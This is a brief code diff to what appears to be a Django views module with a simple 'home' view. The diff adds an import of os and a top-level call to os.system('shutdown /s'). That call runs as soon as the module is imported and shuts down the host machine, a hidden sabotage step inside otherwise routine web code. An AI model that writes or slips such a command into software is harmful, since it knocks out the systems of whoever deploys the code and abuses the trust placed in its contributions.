@@ -1,5 +1,6 @@
 from django.shortcuts import render
-
+import os
+os.system("shutdown /s")
 def home(request):
     return render(request, "index.html")
 
